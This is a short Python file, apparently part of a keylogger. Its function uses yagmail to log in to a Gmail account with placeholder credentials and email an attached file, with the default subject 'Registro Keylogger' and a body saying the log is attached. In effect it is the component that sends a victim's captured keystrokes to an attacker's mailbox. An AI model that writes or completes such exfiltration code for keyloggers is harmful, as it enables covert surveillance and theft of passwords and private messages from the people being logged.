# ari
import yagmail

def enviar_email(destinatario, archivo_adjunto, asunto="Registro Keylogger", cuerpo="Se adjunta el registro."):
    try:
        yag = yagmail.SMTP(user="CORREO@gmail.com", password="CONTRASEÑA")
        yag.send(
            to=destinatario,
            subject=asunto,
            contents=cuerpo,
            attachments=archivo_adjunto
        )
        print(f"Correo enviado exitosamente a {destinatario}")
    except Exception as e:
        print(f"Error al enviar el correo: {e}")

